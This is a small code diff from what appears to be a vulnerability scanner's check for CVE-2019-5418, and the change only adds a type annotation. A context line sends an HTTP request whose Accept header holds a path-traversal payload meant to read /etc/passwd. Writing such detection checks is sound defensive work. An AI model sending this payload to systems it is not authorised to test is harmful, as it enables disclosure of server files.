@@ -11,7 +11,7 @@ def check_cve_2019_5418(url: str) -> List[Result]:
     if not url.endswith("/"):
         return []
 
-    results = []
+    results: List[Result] = []
 
     res = network.http_get(
         url, False, {"Accept": "../../../../../../../../../etc/passwd{{"}
